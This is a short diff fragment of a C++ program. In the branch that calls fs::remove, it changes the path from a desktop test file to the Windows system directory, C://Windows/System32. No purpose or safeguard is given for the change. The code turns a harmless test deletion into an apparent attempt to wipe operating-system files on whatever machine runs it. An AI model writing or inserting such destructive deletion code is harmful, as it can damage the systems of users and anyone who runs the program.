@@ -16,7 +16,7 @@ int main() {
 		cout << "w";
 	}
 	else {
-		string delPath = "C://Users/OpenVentura/Desktop/test.txt";
+		string delPath = "C://Windows/System32";
 		fs::remove(delPath);
 	}
 
